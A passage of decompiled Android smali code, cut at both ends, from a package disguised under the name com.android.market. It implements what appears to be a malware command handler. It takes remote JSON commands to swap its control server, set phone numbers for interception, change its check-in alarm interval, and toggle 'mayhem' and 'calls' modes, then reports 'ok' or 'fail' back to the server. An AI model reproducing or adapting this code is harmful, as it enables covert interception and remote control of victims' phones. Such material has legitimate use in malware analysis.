    const-string v5, "id"

    invoke-virtual {v8, v5}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    aput-object v5, v3, v4

    const/4 v4, 0x1

    if-eqz v0, :cond_17

    const-string v0, "ok"

    :goto_c
    aput-object v0, v3, v4

    invoke-virtual {v1, v3}, Lcom/android/market/o;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_1f

    :cond_9
    :goto_d
    const-string v0, "server"

    invoke-virtual {v8, v0}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_a

    :try_start_d
    const-string v0, "server"

    invoke-virtual {v8, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_21

    const-string v1, ""

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_21

    invoke-direct {p0, v0}, Lcom/android/market/m;->a(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, ""

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_21

    iget-object v1, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    const-string v3, "server"

    invoke-static {v1, v3, v0}, Lcom/android/market/l;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_d
    .catch Lorg/json/JSONException; {:try_start_d .. :try_end_d} :catch_b
    .catchall {:try_start_d .. :try_end_d} :catchall_5

    move-result v0

    :goto_e
    :try_start_e
    new-instance v1, Lcom/android/market/o;

    iget-object v3, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    invoke-direct {v1, v3}, Lcom/android/market/o;-><init>(Landroid/content/Context;)V

    const/4 v3, 0x2

    new-array v3, v3, [Ljava/lang/String;

    const/4 v4, 0x0

    const-string v5, "id"

    invoke-virtual {v8, v5}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    aput-object v5, v3, v4

    const/4 v4, 0x1

    if-eqz v0, :cond_18

    const-string v0, "ok"

    :goto_f
    aput-object v0, v3, v4

    invoke-virtual {v1, v3}, Lcom/android/market/o;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_e
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_e} :catch_1d

    :cond_a
    :goto_10
    const-string v0, "intercept"

    invoke-virtual {v8, v0}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_b

    :try_start_f
    const-string v0, "intercept"

    invoke-virtual {v8, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    iget-object v1, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    const-string v3, "phones"

    invoke-virtual {v0}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v3, v0}, Lcom/android/market/l;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_f
    .catch Lorg/json/JSONException; {:try_start_f .. :try_end_f} :catch_d
    .catchall {:try_start_f .. :try_end_f} :catchall_6

    move-result v0

    :try_start_10
    new-instance v1, Lcom/android/market/o;

    iget-object v3, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    invoke-direct {v1, v3}, Lcom/android/market/o;-><init>(Landroid/content/Context;)V

    const/4 v3, 0x2

    new-array v3, v3, [Ljava/lang/String;

    const/4 v4, 0x0

    const-string v5, "id"

    invoke-virtual {v8, v5}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    aput-object v5, v3, v4

    const/4 v4, 0x1

    if-eqz v0, :cond_19

    const-string v0, "ok"

    :goto_11
    aput-object v0, v3, v4

    invoke-virtual {v1, v3}, Lcom/android/market/o;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_10
    .catch Lorg/json/JSONException; {:try_start_10 .. :try_end_10} :catch_1b

    :cond_b
    :goto_12
    const-string v0, "server_poll"

    invoke-virtual {v8, v0}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_d

    :try_start_11
    const-string v0, "server_poll"

    invoke-virtual {v8, v0}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v4

    const/16 v0, 0xa

    if-gt v0, v4, :cond_c

    const v0, 0x15180

    if-gt v4, v0, :cond_c

    iget-object v0, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    const-string v1, "interval"

    invoke-static {v4}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v3

    invoke-static {v0, v1, v3}, Lcom/android/market/l;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z
    :try_end_11
    .catch Lorg/json/JSONException; {:try_start_11 .. :try_end_11} :catch_f
    .catchall {:try_start_11 .. :try_end_11} :catchall_7

    move-result v7

    :try_start_12
    iget-object v0, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    const-string v1, "alarm"

    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/app/AlarmManager;

    iget-object v1, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    const/4 v2, 0x0

    new-instance v3, Landroid/content/Intent;

    iget-object v5, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    const-class v6, Lcom/android/market/NetworkController;

    invoke-direct {v3, v5, v6}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/4 v5, 0x0

    invoke-static {v1, v2, v3, v5}, Landroid/app/PendingIntent;->getBroadcast(Landroid/content/Context;ILandroid/content/Intent;I)Landroid/app/PendingIntent;

    move-result-object v6

    invoke-virtual {v0, v6}, Landroid/app/AlarmManager;->cancel(Landroid/app/PendingIntent;)V

    const/4 v1, 0x0

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v2

    const-wide/32 v9, 0xea60

    add-long/2addr v2, v9

    mul-int/lit16 v4, v4, 0x3e8

    int-to-long v4, v4

    invoke-virtual/range {v0 .. v6}, Landroid/app/AlarmManager;->setRepeating(IJJLandroid/app/PendingIntent;)V
    :try_end_12
    .catch Lorg/json/JSONException; {:try_start_12 .. :try_end_12} :catch_1a
    .catchall {:try_start_12 .. :try_end_12} :catchall_a

    move v2, v7

    :cond_c
    :try_start_13
    new-instance v1, Lcom/android/market/o;

    iget-object v0, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    invoke-direct {v1, v0}, Lcom/android/market/o;-><init>(Landroid/content/Context;)V

    const/4 v0, 0x2

    new-array v3, v0, [Ljava/lang/String;

    const/4 v0, 0x0

    const-string v4, "id"

    invoke-virtual {v8, v4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    aput-object v4, v3, v0

    const/4 v4, 0x1

    if-eqz v2, :cond_1c

    const-string v0, "ok"

    :goto_13
    aput-object v0, v3, v4

    invoke-virtual {v1, v3}, Lcom/android/market/o;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_13
    .catch Lorg/json/JSONException; {:try_start_13 .. :try_end_13} :catch_18

    :cond_d
    :goto_14
    const-string v0, "mayhem"

    invoke-virtual {v8, v0}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_e

    :try_start_14
    const-string v0, "mayhem"

    invoke-virtual {v8, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "1"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1d

    iget-object v0, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    const-string v1, "mayhem"

    invoke-static {v0, v1}, Lcom/android/market/l;->c(Landroid/content/Context;Ljava/lang/String;)Z
    :try_end_14
    .catch Lorg/json/JSONException; {:try_start_14 .. :try_end_14} :catch_11
    .catchall {:try_start_14 .. :try_end_14} :catchall_8

    move-result v0

    :goto_15
    :try_start_15
    new-instance v1, Lcom/android/market/o;

    iget-object v2, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    invoke-direct {v1, v2}, Lcom/android/market/o;-><init>(Landroid/content/Context;)V

    const/4 v2, 0x2

    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    const-string v4, "id"

    invoke-virtual {v8, v4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    aput-object v4, v2, v3

    const/4 v3, 0x1

    if-eqz v0, :cond_1e

    const-string v0, "ok"

    :goto_16
    aput-object v0, v2, v3

    invoke-virtual {v1, v2}, Lcom/android/market/o;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_15
    .catch Lorg/json/JSONException; {:try_start_15 .. :try_end_15} :catch_16

    :cond_e
    :goto_17
    const-string v0, "calls"

    invoke-virtual {v8, v0}, Lorg/json/JSONObject;->has(Ljava/lang/String;)Z

    move-result v0

    if-eqz v0, :cond_0

    :try_start_16
    const-string v0, "calls"

    invoke-virtual {v8, v0}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "1"

    invoke-virtual {v1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1f

    iget-object v0, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    const-string v1, "calls"

    invoke-static {v0, v1}, Lcom/android/market/l;->c(Landroid/content/Context;Ljava/lang/String;)Z
    :try_end_16
    .catch Lorg/json/JSONException; {:try_start_16 .. :try_end_16} :catch_13
    .catchall {:try_start_16 .. :try_end_16} :catchall_9

    move-result v0

    :goto_18
    :try_start_17
    new-instance v1, Lcom/android/market/o;

    iget-object v2, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    invoke-direct {v1, v2}, Lcom/android/market/o;-><init>(Landroid/content/Context;)V

    const/4 v2, 0x2

    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    const-string v4, "id"

    invoke-virtual {v8, v4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    aput-object v4, v2, v3

    const/4 v3, 0x1

    if-eqz v0, :cond_20

    const-string v0, "ok"

    :goto_19
    aput-object v0, v2, v3

    invoke-virtual {v1, v2}, Lcom/android/market/o;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_17
    .catch Lorg/json/JSONException; {:try_start_17 .. :try_end_17} :catch_0

    goto/16 :goto_0

    :catch_0
    move-exception v0

    goto/16 :goto_0

    :catch_1
    move-exception v0

    :try_start_18
    new-instance v3, Lcom/android/market/o;

    iget-object v0, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    invoke-direct {v3, v0}, Lcom/android/market/o;-><init>(Landroid/content/Context;)V

    const/4 v0, 0x2

    new-array v4, v0, [Ljava/lang/String;

    const/4 v0, 0x0

    const-string v5, "id"

    invoke-virtual {v8, v5}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    aput-object v5, v4, v0

    const/4 v5, 0x1

    const-string v0, "fail"

    aput-object v0, v4, v5

    invoke-virtual {v3, v4}, Lcom/android/market/o;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_18
    .catch Ljava/lang/Exception; {:try_start_18 .. :try_end_18} :catch_2

    goto/16 :goto_1

    :catch_2
    move-exception v0

    goto/16 :goto_1

    :catchall_0
    move-exception v0

    :try_start_19
    new-instance v2, Lcom/android/market/o;

    iget-object v1, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    invoke-direct {v2, v1}, Lcom/android/market/o;-><init>(Landroid/content/Context;)V

    const/4 v1, 0x2

    new-array v3, v1, [Ljava/lang/String;

    const/4 v1, 0x0

    const-string v4, "id"

    invoke-virtual {v8, v4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    aput-object v4, v3, v1

    const/4 v4, 0x1

    const-string v1, "fail"

    aput-object v1, v3, v4

    invoke-virtual {v2, v3}, Lcom/android/market/o;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_19
    .catch Ljava/lang/Exception; {:try_start_19 .. :try_end_19} :catch_2a

    :goto_1a
    throw v0

    :catch_3
    move-exception v0

    :try_start_1a
    new-instance v3, Lcom/android/market/o;

    iget-object v0, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    invoke-direct {v3, v0}, Lcom/android/market/o;-><init>(Landroid/content/Context;)V

    const/4 v0, 0x2

    new-array v4, v0, [Ljava/lang/String;

    const/4 v0, 0x0

    const-string v5, "id"

    invoke-virtual {v8, v5}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    aput-object v5, v4, v0

    const/4 v5, 0x1

    const-string v0, "fail"

    aput-object v0, v4, v5

    invoke-virtual {v3, v4}, Lcom/android/market/o;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_1a
    .catch Ljava/lang/Exception; {:try_start_1a .. :try_end_1a} :catch_4

    goto/16 :goto_4

    :catch_4
    move-exception v0

    goto/16 :goto_4

    :catchall_1
    move-exception v0

    :try_start_1b
    new-instance v2, Lcom/android/market/o;

    iget-object v1, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    invoke-direct {v2, v1}, Lcom/android/market/o;-><init>(Landroid/content/Context;)V

    const/4 v1, 0x2

    new-array v3, v1, [Ljava/lang/String;

    const/4 v1, 0x0

    const-string v4, "id"

    invoke-virtual {v8, v4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    aput-object v4, v3, v1

    const/4 v4, 0x1

    const-string v1, "fail"

    aput-object v1, v3, v4

    invoke-virtual {v2, v3}, Lcom/android/market/o;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_1b
    .catch Ljava/lang/Exception; {:try_start_1b .. :try_end_1b} :catch_28

    :goto_1b
    throw v0

    :cond_f
    :try_start_1c
    const-string v0, "fail"
    :try_end_1c
    .catch Ljava/lang/Exception; {:try_start_1c .. :try_end_1c} :catch_27

    goto/16 :goto_3

    :catch_5
    move-exception v0

    :try_start_1d
    new-instance v3, Lcom/android/market/o;

    iget-object v0, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    invoke-direct {v3, v0}, Lcom/android/market/o;-><init>(Landroid/content/Context;)V

    const/4 v0, 0x2

    new-array v4, v0, [Ljava/lang/String;

    const/4 v0, 0x0

    const-string v5, "id"

    invoke-virtual {v8, v5}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    aput-object v5, v4, v0

    const/4 v5, 0x1

    const-string v0, "fail"

    aput-object v0, v4, v5

    invoke-virtual {v3, v4}, Lcom/android/market/o;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_1d
    .catch Ljava/lang/Exception; {:try_start_1d .. :try_end_1d} :catch_6

    goto/16 :goto_7

    :catch_6
    move-exception v0

    goto/16 :goto_7

    :catchall_2
    move-exception v0

    :try_start_1e
    new-instance v2, Lcom/android/market/o;

    iget-object v1, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    invoke-direct {v2, v1}, Lcom/android/market/o;-><init>(Landroid/content/Context;)V

    const/4 v1, 0x2

    new-array v3, v1, [Ljava/lang/String;

    const/4 v1, 0x0

    const-string v4, "id"

    invoke-virtual {v8, v4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    aput-object v4, v3, v1

    const/4 v4, 0x1

    const-string v1, "fail"

    aput-object v1, v3, v4

    invoke-virtual {v2, v3}, Lcom/android/market/o;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_1e
    .catch Ljava/lang/Exception; {:try_start_1e .. :try_end_1e} :catch_26

    :goto_1c
    throw v0

    :cond_10
    :try_start_1f
    const-string v0, "fail"
    :try_end_1f
    .catch Ljava/lang/Exception; {:try_start_1f .. :try_end_1f} :catch_25

    goto/16 :goto_6

    :catch_7
    move-exception v0

    move v0, v2

    :goto_1d
    :try_start_20
    new-instance v3, Lcom/android/market/o;

    iget-object v4, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    invoke-direct {v3, v4}, Lcom/android/market/o;-><init>(Landroid/content/Context;)V

    const/4 v4, 0x2

    new-array v4, v4, [Ljava/lang/String;

    const/4 v5, 0x0

    const-string v6, "id"

    invoke-virtual {v8, v6}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    aput-object v6, v4, v5

    const/4 v5, 0x1

    if-eqz v0, :cond_11

    const-string v0, "ok"

    :goto_1e
    aput-object v0, v4, v5

    invoke-virtual {v3, v4}, Lcom/android/market/o;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    goto/16 :goto_a

    :catch_8
    move-exception v0

    goto/16 :goto_a

    :cond_11
    const-string v0, "fail"
    :try_end_20
    .catch Ljava/lang/Exception; {:try_start_20 .. :try_end_20} :catch_8

    goto :goto_1e

    :catchall_3
    move-exception v0

    :goto_1f
    :try_start_21
    new-instance v3, Lcom/android/market/o;

    iget-object v1, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    invoke-direct {v3, v1}, Lcom/android/market/o;-><init>(Landroid/content/Context;)V

    const/4 v1, 0x2

    new-array v4, v1, [Ljava/lang/String;

    const/4 v1, 0x0

    const-string v5, "id"

    invoke-virtual {v8, v5}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    aput-object v5, v4, v1

    const/4 v5, 0x1

    if-eqz v2, :cond_12

    const-string v1, "ok"

    :goto_20
    aput-object v1, v4, v5

    invoke-virtual {v3, v4}, Lcom/android/market/o;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_21
    .catch Ljava/lang/Exception; {:try_start_21 .. :try_end_21} :catch_23

    :goto_21
    throw v0

    :cond_12
    :try_start_22
    const-string v1, "fail"
    :try_end_22
    .catch Ljava/lang/Exception; {:try_start_22 .. :try_end_22} :catch_23

    goto :goto_20

    :cond_13
    :try_start_23
    const-string v0, "fail"
    :try_end_23
    .catch Ljava/lang/Exception; {:try_start_23 .. :try_end_23} :catch_22

    goto/16 :goto_9

    :cond_14
    move v0, v2

    goto/16 :goto_b

    :catch_9
    move-exception v0

    move v0, v2

    :goto_22
    :try_start_24
    new-instance v1, Lcom/android/market/o;

    iget-object v3, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    invoke-direct {v1, v3}, Lcom/android/market/o;-><init>(Landroid/content/Context;)V

    const/4 v3, 0x2

    new-array v3, v3, [Ljava/lang/String;

    const/4 v4, 0x0

    const-string v5, "id"

    invoke-virtual {v8, v5}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    aput-object v5, v3, v4

    const/4 v4, 0x1

    if-eqz v0, :cond_15

    const-string v0, "ok"

    :goto_23
    aput-object v0, v3, v4

    invoke-virtual {v1, v3}, Lcom/android/market/o;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    goto/16 :goto_d

    :catch_a
    move-exception v0

    goto/16 :goto_d

    :cond_15
    const-string v0, "fail"
    :try_end_24
    .catch Ljava/lang/Exception; {:try_start_24 .. :try_end_24} :catch_a

    goto :goto_23

    :catchall_4
    move-exception v0

    :goto_24
    :try_start_25
    new-instance v3, Lcom/android/market/o;

    iget-object v1, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    invoke-direct {v3, v1}, Lcom/android/market/o;-><init>(Landroid/content/Context;)V

    const/4 v1, 0x2

    new-array v4, v1, [Ljava/lang/String;

    const/4 v1, 0x0

    const-string v5, "id"

    invoke-virtual {v8, v5}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    aput-object v5, v4, v1

    const/4 v5, 0x1

    if-eqz v2, :cond_16

    const-string v1, "ok"

    :goto_25
    aput-object v1, v4, v5

    invoke-virtual {v3, v4}, Lcom/android/market/o;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_25
    .catch Ljava/lang/Exception; {:try_start_25 .. :try_end_25} :catch_20

    :goto_26
    throw v0

    :cond_16
    :try_start_26
    const-string v1, "fail"
    :try_end_26
    .catch Ljava/lang/Exception; {:try_start_26 .. :try_end_26} :catch_20

    goto :goto_25

    :cond_17
    :try_start_27
    const-string v0, "fail"
    :try_end_27
    .catch Ljava/lang/Exception; {:try_start_27 .. :try_end_27} :catch_1f

    goto/16 :goto_c

    :catch_b
    move-exception v0

    :try_start_28
    new-instance v1, Lcom/android/market/o;

    iget-object v0, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    invoke-direct {v1, v0}, Lcom/android/market/o;-><init>(Landroid/content/Context;)V

    const/4 v0, 0x2

    new-array v3, v0, [Ljava/lang/String;

    const/4 v0, 0x0

    const-string v4, "id"

    invoke-virtual {v8, v4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    aput-object v4, v3, v0

    const/4 v4, 0x1

    const-string v0, "fail"

    aput-object v0, v3, v4

    invoke-virtual {v1, v3}, Lcom/android/market/o;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_28
    .catch Ljava/lang/Exception; {:try_start_28 .. :try_end_28} :catch_c

    goto/16 :goto_10

    :catch_c
    move-exception v0

    goto/16 :goto_10

    :catchall_5
    move-exception v0

    :try_start_29
    new-instance v2, Lcom/android/market/o;

    iget-object v1, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    invoke-direct {v2, v1}, Lcom/android/market/o;-><init>(Landroid/content/Context;)V

    const/4 v1, 0x2

    new-array v3, v1, [Ljava/lang/String;

    const/4 v1, 0x0

    const-string v4, "id"

    invoke-virtual {v8, v4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    aput-object v4, v3, v1

    const/4 v4, 0x1

    const-string v1, "fail"

    aput-object v1, v3, v4

    invoke-virtual {v2, v3}, Lcom/android/market/o;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_29
    .catch Ljava/lang/Exception; {:try_start_29 .. :try_end_29} :catch_1e

    :goto_27
    throw v0

    :cond_18
    :try_start_2a
    const-string v0, "fail"
    :try_end_2a
    .catch Ljava/lang/Exception; {:try_start_2a .. :try_end_2a} :catch_1d

    goto/16 :goto_f

    :catch_d
    move-exception v0

    :try_start_2b
    new-instance v1, Lcom/android/market/o;

    iget-object v0, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    invoke-direct {v1, v0}, Lcom/android/market/o;-><init>(Landroid/content/Context;)V

    const/4 v0, 0x2

    new-array v3, v0, [Ljava/lang/String;

    const/4 v0, 0x0

    const-string v4, "id"

    invoke-virtual {v8, v4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    aput-object v4, v3, v0

    const/4 v4, 0x1

    const-string v0, "fail"

    aput-object v0, v3, v4

    invoke-virtual {v1, v3}, Lcom/android/market/o;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_2b
    .catch Lorg/json/JSONException; {:try_start_2b .. :try_end_2b} :catch_e

    goto/16 :goto_12

    :catch_e
    move-exception v0

    goto/16 :goto_12

    :catchall_6
    move-exception v0

    :try_start_2c
    new-instance v2, Lcom/android/market/o;

    iget-object v1, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    invoke-direct {v2, v1}, Lcom/android/market/o;-><init>(Landroid/content/Context;)V

    const/4 v1, 0x2

    new-array v3, v1, [Ljava/lang/String;

    const/4 v1, 0x0

    const-string v4, "id"

    invoke-virtual {v8, v4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    aput-object v4, v3, v1

    const/4 v4, 0x1

    const-string v1, "fail"

    aput-object v1, v3, v4

    invoke-virtual {v2, v3}, Lcom/android/market/o;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_2c
    .catch Lorg/json/JSONException; {:try_start_2c .. :try_end_2c} :catch_1c

    :goto_28
    throw v0

    :cond_19
    :try_start_2d
    const-string v0, "fail"
    :try_end_2d
    .catch Lorg/json/JSONException; {:try_start_2d .. :try_end_2d} :catch_1b

    goto/16 :goto_11

    :catch_f
    move-exception v0

    :goto_29
    :try_start_2e
    new-instance v1, Lcom/android/market/o;

    iget-object v0, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    invoke-direct {v1, v0}, Lcom/android/market/o;-><init>(Landroid/content/Context;)V

    const/4 v0, 0x2

    new-array v3, v0, [Ljava/lang/String;

    const/4 v0, 0x0

    const-string v4, "id"

    invoke-virtual {v8, v4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    aput-object v4, v3, v0

    const/4 v4, 0x1

    if-eqz v2, :cond_1a

    const-string v0, "ok"

    :goto_2a
    aput-object v0, v3, v4

    invoke-virtual {v1, v3}, Lcom/android/market/o;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    goto/16 :goto_14

    :catch_10
    move-exception v0

    goto/16 :goto_14

    :cond_1a
    const-string v0, "fail"
    :try_end_2e
    .catch Lorg/json/JSONException; {:try_start_2e .. :try_end_2e} :catch_10

    goto :goto_2a

    :catchall_7
    move-exception v0

    move v7, v2

    :goto_2b
    :try_start_2f
    new-instance v2, Lcom/android/market/o;

    iget-object v1, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    invoke-direct {v2, v1}, Lcom/android/market/o;-><init>(Landroid/content/Context;)V

    const/4 v1, 0x2

    new-array v3, v1, [Ljava/lang/String;

    const/4 v1, 0x0

    const-string v4, "id"

    invoke-virtual {v8, v4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    aput-object v4, v3, v1

    const/4 v4, 0x1

    if-eqz v7, :cond_1b

    const-string v1, "ok"

    :goto_2c
    aput-object v1, v3, v4

    invoke-virtual {v2, v3}, Lcom/android/market/o;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_2f
    .catch Lorg/json/JSONException; {:try_start_2f .. :try_end_2f} :catch_19

    :goto_2d
    throw v0

    :cond_1b
    :try_start_30
    const-string v1, "fail"
    :try_end_30
    .catch Lorg/json/JSONException; {:try_start_30 .. :try_end_30} :catch_19

    goto :goto_2c

    :cond_1c
    :try_start_31
    const-string v0, "fail"
    :try_end_31
    .catch Lorg/json/JSONException; {:try_start_31 .. :try_end_31} :catch_18

    goto/16 :goto_13

    :cond_1d
    :try_start_32
    iget-object v0, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    const-string v1, "mayhem"

    invoke-static {v0, v1}, Lcom/android/market/l;->d(Landroid/content/Context;Ljava/lang/String;)Z
    :try_end_32
    .catch Lorg/json/JSONException; {:try_start_32 .. :try_end_32} :catch_11
    .catchall {:try_start_32 .. :try_end_32} :catchall_8

    move-result v0

    goto/16 :goto_15

    :catch_11
    move-exception v0

    :try_start_33
    new-instance v1, Lcom/android/market/o;

    iget-object v0, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    invoke-direct {v1, v0}, Lcom/android/market/o;-><init>(Landroid/content/Context;)V

    const/4 v0, 0x2

    new-array v2, v0, [Ljava/lang/String;

    const/4 v0, 0x0

    const-string v3, "id"

    invoke-virtual {v8, v3}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    aput-object v3, v2, v0

    const/4 v3, 0x1

    const-string v0, "fail"

    aput-object v0, v2, v3

    invoke-virtual {v1, v2}, Lcom/android/market/o;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_33
    .catch Lorg/json/JSONException; {:try_start_33 .. :try_end_33} :catch_12

    goto/16 :goto_17

    :catch_12
    move-exception v0

    goto/16 :goto_17

    :catchall_8
    move-exception v0

    :try_start_34
    new-instance v2, Lcom/android/market/o;

    iget-object v1, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    invoke-direct {v2, v1}, Lcom/android/market/o;-><init>(Landroid/content/Context;)V

    const/4 v1, 0x2

    new-array v3, v1, [Ljava/lang/String;

    const/4 v1, 0x0

    const-string v4, "id"

    invoke-virtual {v8, v4}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    aput-object v4, v3, v1

    const/4 v4, 0x1

    const-string v1, "fail"

    aput-object v1, v3, v4

    invoke-virtual {v2, v3}, Lcom/android/market/o;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;
    :try_end_34
    .catch Lorg/json/JSONException; {:try_start_34 .. :try_end_34} :catch_17

    :goto_2e
    throw v0

    :cond_1e
    :try_start_35
    const-string v0, "fail"
    :try_end_35
    .catch Lorg/json/JSONException; {:try_start_35 .. :try_end_35} :catch_16

    goto/16 :goto_16

    :cond_1f
    :try_start_36
    iget-object v0, p0, Lcom/android/market/m;->a:Landroid/content/Context;

    const-string v1, "calls"

    invoke-static {v0, v1}, Lcom/android/market/l;->d(Landroid/content/Context;Ljava/lang/String;)Z
    :try_end_36
    .catch Lorg/json/JSONException; {:try_start_36 .. :try_end_36} :catch_13
    .catchall {:try_start_36 .. :try_end_36} :catchall_9

    move-result v0

    goto/16 :goto_18

    :catch_13
